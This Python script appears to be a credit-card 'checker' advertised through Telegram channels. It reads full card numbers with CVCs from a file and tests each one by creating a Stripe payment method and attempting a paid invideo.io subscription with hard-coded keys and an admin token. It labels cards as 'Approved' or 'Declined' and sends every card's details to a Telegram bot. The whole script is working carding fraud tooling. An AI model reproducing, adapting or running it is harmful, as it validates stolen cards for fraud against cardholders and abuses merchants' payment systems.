import requests
import time
from telegram import Bot
import pyfiglet
import datetime

Z = '\033[1;31m'
F = '\033[2;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'

logo = pyfiglet.figlet_format('          </> BESoN <\> ')
print(Z + logo)

a = "#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!3!!#"
print(C + a)

V = "BY CHANNAL >>> BESoN~SCRAPING >>> @python_proffetional"
print(B + V)

i = "#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!3!!#"
print(B + i)

print('''

THIS IS CHANNAL : BESON

A) https://t.me/python_proffetional
B) https://t.me/x6_83
C) https://t.me/beson_0_1
D) https://t.me/beson_sk
E) https://t.me/shop_beson_0_BOT
F) https://t.me/be_01a

''')

print('''

1) The tools are made by Arab developers..
2) The tool is developed by the BESoN team
3) The tool will always change its gates but not the same gate.
4) The tool will develop more and more.
5) We make blocking tools and bots at excellent prices.
6) Users Developers (BESoN Team).
7) ~~~ @x6f_0:{BESON} >>> @BXX44:{NARUTO} >>> @zeus_coming:{ZEUS} ~~~

''')

o = "#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!#!!3!!#\n"
print(F + o)

token = input("ENTER YOUR TOKEN : ")
chat_id = input("ENTER YOUR ID : ")

with open('BESON.txt', 'r') as file:
    credit_cards = file.read().splitlines()

headers_first_request = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
}

headers_second_request = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
    'AuthToken': 'eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjpbImFkbWluIl0sImFjY291bnQiOjEwNTkxOTYxLCJ2ZXJzaW9uIjoiMC43LjAiLCJjb25maWciOiJpbnZpZGVvIiwiaXNfZ3Vlc3QiOmZhbHNlLCJzdWIiOiIxMTA0OTI1MDgyNDUzODUxNzI2NDkiLCJpYXQiOjE2ODk0NTY4ODcsImV4cCI6MTcwNTAwODg4NywidmVyIjoyLCJpc3MiOiJpdi1hdXRoLXByb2R1Y3Rpb24ifQ.oJJh9GGzezSOq6SCT9K0GCSiMZSA6jUMt9pGXj8SgCC6sR_xV94h1qcbFosoTOC39wnaLkhQHNn-1HeKBQxgrg',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://invideo.io',
    'Referer': 'https://invideo.io/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}


end_date = datetime.datetime(2023, 7, 18, 12, 0, 0)

for credit_card in credit_cards:
    
    if datetime.datetime.now() > end_date:
        print("لقد تم ايقاف الأداة يرجى التواصل مع المطور @x6f_0 < بيسون >")
        break

    card_number, exp_month, exp_year, cvc = credit_card.split('|')

    data_first_request = f'type=card&billing_details[name]=Ziko+Alhacker&billing_details[email]=vlogeramjad%40gmail.com&billing_details[address][country]=PS&billing_details[address][line1]=vesey+street+137&billing_details[address][postal_code]=10080&billing_details[address][state]=GZA&card[number]={card_number}&card[cvc]={cvc}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&guid=9fb61995-4af3-4c06-8081-7f84afa3bad5807102&muid=6057bd76-4d68-4106-8596-04576d6fabae3c112e&sid=b654e22b-a5d3-4312-b645-07e15325557dff9d52&payment_user_agent=stripe.js%2Fc68765f93f%3B+stripe-js-v3%2Fc68765f93f%3B+split-card-element&time_on_page=226163&key=pk_live_51HSznmB70smKt9XGjKnsD4NYu5Me7UJQXUrOp9WLy5aLoVTqNKZoAfmbOSTbY5C5TKUJNdKJ71evDgfJPbSMqKtA00srKHMRia'

    response_first_request = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_first_request, data=data_first_request)
    response_data_first_request = response_first_request.json()
    source = response_data_first_request.get('id')

    json_data_second_request = {
        'gateway': 'stripe',
        'source': source,
        'coupon': None,
        'geo_info': {
            'country_code': 'PS',
            'region': 'GZA',
        },
        'gateway_plan_id': 'price_1IjM7YB70smKt9XGujSnk7l7',
        'product_code': 'BUSINESS_MONTHLY',
        'product_id': 'prod_G0YeQ2g76EZ5BE',
        'ref': '',
        'is_corrily_enabled': False,
    }

    time.sleep(10)

    response_second_request = requests.post('https://payments.invideo.io/subscribe', headers=headers_second_request, json=json_data_second_request)
    response_data_second_request = response_second_request.json()
    customer_error = response_data_second_request.get('customer_error', 'Unknown error')

    card_info = f"{card_number}|{exp_month}|{exp_year}|{cvc}"

    cc = card_number.replace(" ", "")
    api = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
    country_name = api['country']['name']
    emoji = api['country']['emoji']
    bank = api.get('bank', {}).get('name', '------')
    bin_info = api['number'].get('length', '------')

    if "Your card has insufficient funds" in customer_error:
        message = f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n𝗖𝗖 ⇾ {card_info}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth 4\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Your card has insufficient funds\n\n𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_name} {emoji}\n\n𝗧𝗼𝗼𝗸 10 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    elif "security code is incorrect" in customer_error:
        message = f"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n𝗖𝗖 ⇾ {card_info}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth 4\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ 1000: Approved\n\n𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_name} {emoji}\n\n𝗧𝗼𝗼𝗸 10 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    elif "Your card does not support this type of purchase." in customer_error:
        message = f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n𝗖𝗖 ⇾ {card_info}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth 4\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Your card does not support this type of purchase.\n\n𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_name} {emoji}\n\n𝗧𝗼𝗼𝗸 10 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    elif "Your card's expiration month is invalid." in customer_error:
        message = f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n𝗖𝗖 ⇾ {card_info}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth 4\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Your card's expiration month is invalid.\n\n𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_name} {emoji}\n\n𝗧𝗼𝗼𝗸 10 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
    else:
        message = f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n𝗖𝗖 ⇾ {card_info}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Braintree Auth 4\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {customer_error}\n\n𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country_name} {emoji}\n\n𝗧𝗼𝗼𝗸 10 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"

    print(message)

    bot = Bot(token=token)
    bot.send_message(chat_id=chat_id, text=message)

